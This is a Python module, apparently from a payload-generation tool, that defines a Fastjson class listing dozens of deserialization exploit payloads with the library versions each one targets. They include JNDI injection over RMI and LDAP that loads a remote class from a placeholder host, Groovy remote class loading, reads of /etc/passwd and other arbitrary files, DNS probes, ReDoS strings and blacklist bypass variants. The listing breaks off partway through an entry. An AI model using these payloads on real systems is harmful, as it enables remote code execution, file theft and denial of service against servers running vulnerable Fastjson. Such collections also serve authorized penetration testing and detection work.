import os
import logging
from .serializer import Serializer

class Fastjson(Serializer):

    gadgets = [
        {
            'id': 'fastjson-jdbcrowsetimpl-rmi-1.1.15-1.2.24',
            'name': 'fastjson-jdbcrowsetimpl-rmi-1.1.15-1.2.24',
            'description': 'Fastjson JdbcRowSetImpl RMI 1.1.15 < 1.2.24',
            'output': 'json',
            'payload': '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://<domain>/<className>", "autoCommit":true}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-jdbcrowsetimpl-ldap-1.1.15-1.2.24',
            'name': 'fastjson-jdbcrowsetimpl-ldap-1.1.15-1.2.24',
            'description': 'Fastjson JdbcRowSetImpl LDAP 1.1.15 < 1.2.24',
            'output': 'json',
            'payload': '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://<domain>/<className>", "autoCommit":true}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-universal-parseobject-rmi',
            'name': 'fastjson-universal-parseobject-rmi',
            'description': 'Fastjson Universal ParseObject RMI',
            'output': 'json',
            'payload': '{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://<domain>/<className>", "autoCommit":true}}""}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-ldap-1.2.9-1.2.47',
            'name': 'fastjson-ldap-1.2.9-1.2.47',
            'description': 'Fastjson LDAP 1.2.9 < 1.2.47',
            'output': 'json',
            'payload': '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://<domain>/<className>","autoCommit":true}}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-universal-parseobject-ldap',
            'name': 'fastjson-universal-parseobject-ldap',
            'description': 'Fastjson Universal ParseObject LDAP',
            'output': 'json',
            'payload': '{"@type":"com.alibaba.fastjson.JSONObject",{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://<domain>/<className>","autoCommit":true}}}""}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-redos-1.2.36-1.2.62',
            'name': 'fastjson-1.2.36-1.2.62',
            'description': 'Fastjson ReDOS 1.2.36 < 1.2.62',
            'output': 'json',
            'payload': '{"regex":{"$ref":"$[blue rlike \'^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$\']"},"blue":"aaaaaaaaaaaa!"}',
            'unsafe': True,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-dns-1.2.43-1',
            'name': 'fastjson-dns-1.2.43-1',
            'description': 'Fastjson DNS < 1.2.43 (1)',
            'output': 'json',
            'payload': '{"@type":"java.net.URL","val":"http://<domain>"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-dns-1.2.43-2',
            'name': 'fastjson-dns-1.2.43-2',
            'description': 'Fastjson DNS < 1.2.43 (2)',
            'output': 'json',
            'payload': '{{"@type":"java.net.URL","val":"http://<domain>"}:"x"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-dns-1.2.48',
            'name': 'fastjson-dns-1.2.48',
            'description': 'Fastjson DNS < 1.2.48',
            'output': 'json',
            'payload': '{"@type":"java.net.InetAddress","val":"<domain>"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-dns-1.2.68-1',
            'name': 'fastjson-dns-1.2.68-1',
            'description': 'Fastjson DNS < 1.2.68 (1)',
            'output': 'json',
            'payload': '{"@type":"java.net.Inet4Address","val":"<domain>"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-dns-1.2.68-2',
            'name': 'fastjson-dns-1.2.68-2',
            'description': 'Fastjson DNS < 1.2.68 (2)',
            'output': 'json',
            'payload': '{"@type":"java.net.Inet6Address","val":"<domain>"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-dns-1.2.68-3',
            'name': 'fastjson-dns-1.2.68-3',
            'description': 'Fastjson DNS < 1.2.68 (3)',
            'output': 'json',
            'payload': '{{"@type":"java.net.URL","val":"<domain>"}:"aaa"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-dns-1.2.68-4',
            'name': 'fastjson-dns-1.2.68-4',
            'description': 'Fastjson DNS < 1.2.68 (4)',
            'output': 'json',
            'payload': '{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://<domain>"}}""}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-dns-1.2.68-5',
            'name': 'fastjson-dns-1.2.68-5',
            'description': 'Fastjson DNS < 1.2.68 (5)',
            'output': 'json',
            'payload': 'Set[{"@type":"java.net.URL","val":"http://<domain>"}]',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-dns-1.2.68-6',
            'name': 'fastjson-dns-1.2.68-6',
            'description': 'Fastjson DNS < 1.2.68 (6)',
            'output': 'json',
            'payload': 'Set[{"@type":"java.net.URL","val":"http://<domain>"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-dns-1.2.68-7',
            'name': 'fastjson-dns-1.2.68-7',
            'description': 'Fastjson DNS < 1.2.68 (7)',
            'output': 'json',
            'payload': '{"@type":"java.net.InetSocketAddress"{"address":,"val":"<domain>"}}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-dns-1.2.68-8',
            'name': 'fastjson-dns-1.2.68-8',
            'description': 'Fastjson DNS < 1.2.68 (8)',
            'output': 'json',
            'payload': '{{"@type":"java.net.URL","val":"http://<domain>"}:0',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-dns-1.2.68-9',
            'name': 'fastjson-dns-1.2.68-9',
            'description': 'Fastjson DNS < 1.2.68 (9)',
            'output': 'json',
            'payload': '[{"@type":"java.net.CookiePolicy"},{"@type":"java.net.Inet4Address","val":"<domain>"}]',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-rce-dns-1.2.47',
            'name': 'fastjson-rce-dns-1.2.47',
            'description': 'Fastjson RCE DNS 1.2.47',
            'output': 'json',
            'payload': '[{"@type":"java.lang.Class","val":"java.io.ByteArrayOutputStream"},{"@type":"java.io.ByteArrayOutputStream"},{"@type":"java.net.InetSocketAddress"{"address":,"val":"<domain>"}}]',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-rce-dns-1.2.68',
            'name': 'fastjson-rce-dns-1.2.68',
            'description': 'Fastjson RCE DNS 1.2.68',
            'output': 'json',
            'payload': '[{"@type":"java.lang.AutoCloseable","@type":"java.io.ByteArrayOutputStream"},{"@type":"java.io.ByteArrayOutputStream"},{"@type":"java.net.InetSocketAddress"{"address":,"val":"<domain>"}}]',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-rce-dns-1.2.80-83',
            'name': 'fastjson-rce-dns-1.2.80-83',
            'description': 'Fastjson RCE DNS 1.2.80 or 1.2.83',
            'output': 'json',
            'payload': '[{"@type":"java.lang.Exception","@type":"com.alibaba.fastjson.JSONException","x":{"@type":"java.net.InetSocketAddress"{"address":,"val":"<domain>"}}},{"@type":"java.lang.Exception","@type":"com.alibaba.fastjson.JSONException","message":{"@type":"java.net.InetSocketAddress"{"address":,"val":"<domain>"}}}]',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-dns-dependencies',
            'name': 'fastjson-dns-dependencies',
            'description': 'Fastjson DNS dependencies detection',
            'output': 'json',
            'payload': '{"@type":"java.net.Inet4Address","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"java.util.Locale","language":{"@type":"java.lang.String"{1:{"@type":"java.lang.Class","val":"groovy.lang.GroovyShell"}},"country":"<domain>"}}}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-aspectj-ognl-lfi',
            'name': 'fastjson-aspectj-ognl-lfi',
            'description': 'Fastjson Aspectj + ognl file read',
            'output': 'json',
            'payload': '{"a":{"@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit","fileName":"/etc/passwd"},"b":{"@type":"java.net.Inet4Address","val":{"@type":"java.lang.String"{"@type":"java.util.Locale", "val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type": "java.lang.String""@type":"java.util.Locale", "language":{"@type":"java.lang.String"{"$ref":"$"},"country":"<domain>"}}}}}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-commonsio-ognl-urlreader-1',
            'name': 'fastjson-commonsio-ognl-urlreader-1',
            'description': 'Fastjson commons-io + ognl + URLReader single-byte file reading 1',
            'output': 'json',
            'payload': '{"su14":{"@type":"java.lang.Exception","@type":"ognl.OgnlException"},"su15":{"@type":"java.lang.Class","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"ognl.OgnlException","_evaluation":""}},"su16":{"@type":"ognl.Evaluation","node":{"@type":"ognl.ASTMethod","p":{"@type":"ognl.OgnlParser","stream":{"@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":"http://<domain>"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[98]}]}}}},"su17":{"$ref":"$.su16.node.p.stream"},"su18":{"$ref":"$.su17.bOM.bytes"}}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-commonsio-ognl-urlreader-2',
            'name': 'fastjson-commonsio-ognl-urlreader-2',
            'description': 'Fastjson commons-io + ognl + URLReader single-byte file reading 2',
            'output': 'json',
            'payload': '[{"su15":{"@type":"java.lang.Exception","@type":"ognl.OgnlException",}},{"su16":{"@type":"java.lang.Class","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"ognl.OgnlException","_evaluation":""}}},{"su17":{"@type":"ognl.Evaluation","node":{"@type":"ognl.ASTMethod","p":{"@type":"ognl.OgnlParser","stream":{"@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":"http://<domain>"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[98]}]}}}}},{"su18":{"$ref":"$[2].su17.node.p.stream"}},{"su19":{"$ref":"$[3].su18.bOM.bytes"}},{"su22":{"@type":"ognl.Evaluation","node":{"@type":"ognl.ASTMethod","p":{"@type":"ognl.OgnlParser","stream":{"@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":{"@type":"java.lang.String"{"@type":"java.net.URL","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"java.util.Locale","language":"http://<domain>","country":{"@type":"java.lang.String"{"$ref":"98"}}}}},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[1]}]}}}}},{"su23":{"$ref":"$[5].su22.node.p.stream"}},{"su20":{"@type":"ognl.Evaluation","node":{"@type":"ognl.ASTMethod","p":{"@type":"ognl.OgnlParser","stream":{"@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.CharSequenceReader","charSequence":{"@type":"java.lang.String"{"$ref":"$[4].su19"},"start":0,"end":0},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[1]}]}}}}},{"su21":{"$ref":"$[7].su20.node.p.stream"}}]',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-commonsio-ognl-urlreader-3',
            'name': 'fastjson-commonsio-ognl-urlreader-3',
            'description': 'Fastjson commons-io + ognl + URLReader single-byte file reading 3',
            'output': 'json',
            'payload': '[{"su15":{"@type":"java.lang.Exception","@type":"ognl.OgnlException",}},{"su16":{"@type":"java.lang.Class","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"ognl.OgnlException","_evaluation":""}}},{"su17":{"@type":"ognl.Evaluation","node":{"@type":"ognl.ASTMethod","p":{"@type":"ognl.OgnlParser","stream":{"@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":"http://<domain>"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[98]}]}}}}},{"su18":{"$ref":"$[2].su17.node.p.stream"}},{"su19":{"$ref":"$[3].su18.bOM.bytes"}},{"su22":{"@type":"ognl.Evaluation","node":{"@type":"ognl.ASTMethod","p":{"@type":"ognl.OgnlParser","stream":{"@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":{"@type":"java.lang.String"{"@type":"java.net.URL","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"java.util.Locale","language":"http://<domain>","country":{"@type":"java.lang.String"{"$ref":"98"}}}}},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[1]}]}}}}},{"su23":{"$ref":"$[5].su22.node.p.stream"}},{"su20":{"@type":"ognl.Evaluation","node":{"@type":"ognl.ASTMethod","p":{"@type":"ognl.OgnlParser","stream":{"@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.CharSequenceReader","charSequence":{"@type":"java.lang.String"{"$ref":"$[4].su19"},"start":0,"end":0},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[1]}]}}}}},{"su21":{"$ref":"$[7].su20.node.p.stream"}}]',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-commonsio-ognl-urlreader-4',
            'name': 'fastjson-commonsio-ognl-urlreader-4',
            'description': 'Fastjson commons-io + ognl + URLReader single-byte file reading 4',
            'output': 'json',
            'payload': '{"su14":{"@type":"java.lang.Exception","@type":"ognl.OgnlException"},"su15":{"@type":"java.lang.Class","val":{ "@type":"com.alibaba.fastjson.JSONObject",{  "@type":"java.lang.String"  "@type":"ognl.OgnlException",  "_evaluation":""}},"su16":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":{     "@type": "org.apache.commons.io.input.BOMInputStream",     "delegate": {       "@type": "org.apache.commons.io.input.ReaderInputStream",       "reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":{"@type":"java.lang.String"{"@type":"java.net.URL","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type": "java.lang.String""@type":"java.util.Locale","language":"http://<domain>","country":{"@type":"java.lang.String"[{"@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit","fileName":"<remote_file_to_read>"}]}}}},       "charsetName": "UTF-8",       "bufferSize": 1024},"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [1]}]}}}},"su17" : {"$ref":"$.su16.node.p.stream"}}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-aspectj-character-error-echo-lfi',
            'name': 'fastjson-aspectj-character-error-echo-lfi',
            'description': 'Fastjson aspectj read file + character error echo',
            'output': 'json',
            'payload': '{"@type":"java.lang.Character"{"c":{"@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit","fileName":"<remote_file_to_read>"}}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-groovy-remote-class-loading',
            'name': 'fastjson-groovy-remote-class-loading',
            'description': 'Fastjson groovy remote class loading',
            'output': 'json',
            'payload': '{"@type":"org.codehaus.groovy.control.ProcessingUnit","@type":"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit","config":{"@type":"org.codehaus.groovy.control.CompilerConfiguration","classpathList":["http://<domain>/<className>"]},"gcl":null,"destDir":"/tmp"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-c3p0-jndirefforwardingdatasource-rmi-1.2.22-1.2.24',
            'name': 'fastjson-c3p0-jndirefforwardingdatasource-rmi-1.2.22-1.2.24',
            'description': 'Fastjson c3p0#JndiRefForwardingDataSource RMI 1.2.22 < 1.2.24',
            'output': 'json',
            'payload': '{"@type":"com.mchange.v2.c3p0.JndiRefForwardingDataSource","jndiName":"rmi://<domain>/<className>", "loginTimeout":0}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-c3p0-jndirefforwardingdatasource-ldap-1.2.22-1.2.24',
            'name': 'fastjson-c3p0-jndirefforwardingdatasource-ldap-1.2.22-1.2.24',
            'description': 'Fastjson c3p0#JndiRefForwardingDataSource LDAP 1.2.22 < 1.2.24',
            'output': 'json',
            'payload': '{"@type":"com.mchange.v2.c3p0.JndiRefForwardingDataSource","jndiName":"ldap://<domain>/<className>", "loginTimeout":0}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-shiro-jndiobjectfactory-rmi-1.2.22-1.2.24',
            'name': 'fastjson-shiro-jndiobjectfactory-rmi-1.2.22-1.2.24',
            'description': 'Fastjson shiro#JndiObjectFactory RMI 1.2.22 < 1.2.24',
            'output': 'json',
            'payload': '{"@type":"org.apache.shiro.jndi.JndiObjectFactory", "resourceName":"rmi://<domain>/<className>"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-shiro-jndiobjectfactory-ldap-1.2.22-1.2.24',
            'name': 'fastjson-shiro-jndiobjectfactory-ldap-1.2.22-1.2.24',
            'description': 'Fastjson shiro#JndiObjectFactory LDAP 1.2.22 < 1.2.24',
            'output': 'json',
            'payload': '{"@type":"org.apache.shiro.jndi.JndiObjectFactory", "resourceName":"ldap://<domain>/<className>"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-shiro-jndirealmfactory-rmi-1.2.22-1.2.24',
            'name': 'fastjson-shiro-jndirealmfactory-rmi-1.2.22-1.2.24',
            'description': 'Fastjson shiro#JndiRealmFactory RMI 1.2.22 < 1.2.24',
            'output': 'json',
            'payload': '{"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory", "jndiNames":"rmi://<domain>/<className>"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-shiro-jndirealmfactory-ldap-1.2.22-1.2.24',
            'name': 'fastjson-shiro-jndirealmfactory-ldap-1.2.22-1.2.24',
            'description': 'Fastjson shiro#JndiRealmFactory LDAP 1.2.22 < 1.2.24',
            'output': 'json',
            'payload': '{"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory", "jndiNames":"ldap://<domain>/<className>"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-l-jdbcrowsetimpl-rmi-1.1.15-1.2.24',
            'name': 'fastjson-l-jdbcrowsetimpl-rmi-1.1.15-1.2.24',
            'description': 'Fastjson JdbcRowSetImpl L bypass RMI 1.1.15 < 1.2.24',
            'output': 'json',
            'payload': '{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"rmi://<domain>/<className>", "autoCommit":true}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-l-jdbcrowsetimpl-ldap-1.1.15-1.2.24',
            'name': 'fastjson-l-jdbcrowsetimpl-ldap-1.1.15-1.2.24',
            'description': 'Fastjson JdbcRowSetImpl L bypass LDAP 1.1.15 < 1.2.24',
            'output': 'json',
            'payload': '{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://<domain>/<className>", "autoCommit":true}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-ll-jdbcrowsetimpl-rmi-1.1.15-1.2.24',
            'name': 'fastjson-ll-jdbcrowsetimpl-rmi-1.1.15-1.2.24',
            'description': 'Fastjson JdbcRowSetImpl LL bypass RMI 1.1.15 < 1.2.24',
            'output': 'json',
            'payload': '{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"rmi://<domain>/<className>", "autoCommit":true}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-ll-jdbcrowsetimpl-ldap-1.1.15-1.2.24',
            'name': 'fastjson-ll-jdbcrowsetimpl-ldap-1.1.15-1.2.24',
            'description': 'Fastjson JdbcRowSetImpl LL bypass LDAP 1.1.15 < 1.2.24',
            'output': 'json',
            'payload': '{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://<domain>/<className>", "autoCommit":true}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-bracket-jdbcrowsetimpl-rmi-1.2.25-1.2.43',
            'name': 'fastjson-bracket-jdbcrowsetimpl-rmi-1.2.25-1.2.43',
            'description': 'Fastjson JdbcRowSetImpl [{ bypass RMI 1.2.25 < 1.2.43',
            'output': 'json',
            'payload': '{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"rmi://<domain>/<className>", "autoCommit":true}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-bracket-jdbcrowsetimpl-ldap-1.2.25-1.2.43',
            'name': 'fastjson-bracket-jdbcrowsetimpl-ldap-1.2.25-1.2.43',
            'description': 'Fastjson JdbcRowSetImpl [{ bypass LDAP 1.2.25 < 1.2.43',
            'output': 'json',
            'payload': '{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"ldap://<domain>/<className>", "autoCommit":true}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-mybatis-rmi-1.2.25-1.2.45',
            'name': 'fastjson-mybatis-rmi-1.2.25-1.2.45',
            'description': 'Fastjson Mybatis RMI 1.2.25 < 1.2.45',
            'output': 'json',
            'payload': '{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://<domain>/<className>"}}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-mybatis-ldap-1.2.25-1.2.45',
            'name': 'fastjson-mybatis-ldap-1.2.25-1.2.45',
            'description': 'Fastjson Mybatis LDAP 1.2.25 < 1.2.45',
            'output': 'json',
            'payload': '{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://<domain>/<className>"}}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-mapcache-rmi-1.2.25-1.2.47',
            'name': 'fastjson-mapcache-rmi-1.2.25-1.2.47',
            'description': 'Fastjson MapCache RMI 1.2.25 < 1.2.47',
            'output': 'json',
            'payload': '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://<domain>/<className>","autoCommit":true}}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-mapcache-ldap-1.2.25-1.2.47',
            'name': 'fastjson-mapcache-ldap-1.2.25-1.2.47',
            'description': 'Fastjson MapCache LDAP 1.2.25 < 1.2.47',
            'output': 'json',
            'payload': '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://<domain>/<className>","autoCommit":true}}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-redos-1.2.36-1.2.62-1',
            'name': 'fastjson-redos-1.2.36-1.2.62-1',
            'description': 'Fastjson Regex DOS 1.2.36 < 1.2.62 (1)',
            'output': 'json',
            'payload': '{"regex":{"$ref":"$[\\blue=/\^[a-zA-Z]+(([a-zA-Z])?[a-zA-Z]*)*$/]"},"blue":"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}',
            'unsafe': True,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-redos-1.2.36-1.2.62-2',
            'name': 'fastjson-redos-1.2.36-1.2.62-2',
            'description': 'Fastjson Regex DOS 1.2.36 < 1.2.62 (2)',
            'output': 'json',
            'payload': '{"regex":{"$ref":"$[bluerlike\'^[a-zA-Z]+(([a-zA-Z])?[a-zA-Z]*)*$\']"},"blue":"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}',
            'unsafe': True,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-hikari-rmi-1.2.5-1.2.59-1',
            'name': 'fastjson-hikari-rmi-1.2.5-1.2.59-1',
            'description': 'Fastjson HikariConfig RMI 1.2.5 <= 1.2.59 (1)',
            'output': 'json',
            'payload': '{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"rmi://<domain>/<className>"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-hikari-ldap-1.2.5-1.2.59-1',
            'name': 'fastjson-hikari-ldap-1.2.5-1.2.59-1',
            'description': 'Fastjson HikariConfig LDAP 1.2.5 <= 1.2.59 (1)',
            'output': 'json',
            'payload': '{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://<domain>/<className>"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-hikari-rmi-1.2.5-1.2.59-2',
            'name': 'fastjson-hikari-rmi-1.2.5-1.2.59-2',
            'description': 'Fastjson HikariConfig RMI 1.2.5 <= 1.2.59 (2)',
            'output': 'json',
            'payload': '{"@type":"com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"rmi://<domain>/<className>"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-hikari-ldap-1.2.5-1.2.59-2',
            'name': 'fastjson-hikari-ldap-1.2.5-1.2.59-2',
            'description': 'Fastjson HikariConfig LDAP 1.2.5 <= 1.2.59 (2)',
            'output': 'json',
            'payload': '{"@type":"com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://<domain>/<className>"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-oraclemanagedconnectionfactory-rmi-1.2.5-1.2.60',
            'name': 'fastjson-oraclemanagedconnectionfactory-rmi-1.2.5-1.2.60',
            'description': 'Fastjson OracleManagedConnectionFactory RMI 1.2.5 <= 1.2.60',
            'output': 'json',
            'payload': '{"@type":"oracle.jdbc.connector.OracleManagedConnectionFactory","xaDataSourceName":"rmi://<domain>/<className>"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-oraclemanagedconnectionfactory-ldap-1.2.5-1.2.60',
            'name': 'fastjson-oraclemanagedconnectionfactory-ldap-1.2.5-1.2.60',
            'description': 'Fastjson OracleManagedConnectionFactory LDAP 1.2.5 <= 1.2.60',
            'output': 'json',
            'payload': '{"@type":"oracle.jdbc.connector.OracleManagedConnectionFactory","xaDataSourceName":"ldap://<domain>/<className>"}',
            'unsafe': False,
            'ref': 'https://github.com/safe6Sec/Fastjson'
        },
        {
            'id': 'fastjson-jndiconfiguration-rmi-1.2.5-1.2.60',
